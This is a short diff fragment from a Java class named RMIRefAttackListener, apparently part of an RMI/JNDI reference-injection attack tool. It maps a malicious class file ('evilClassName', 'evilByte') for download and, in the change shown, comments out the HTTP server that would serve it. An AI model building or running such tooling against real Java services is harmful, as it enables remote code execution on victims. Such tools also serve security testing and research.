@@ -31,8 +31,8 @@ public class RMIRefAttackListener {
         new Thread(()->{
             HashMap<String, byte[]> hashMap = new HashMap<>();
             hashMap.put(String.format("/%s.class",evilClassName),evilByte);
-            System.out.println(String.format("[+] Running HttpServer on http://%s:%s",httpServerAddr,httpServerPort));
-            new HttpServer(httpServerPort,hashMap).start();
+            //System.out.println(String.format("[+] Running HttpServer on http://%s:%s",httpServerAddr,httpServerPort));
+            //new HttpServer(httpServerPort,hashMap).start();
         }).start();
 
         Thread.sleep(2*1000);
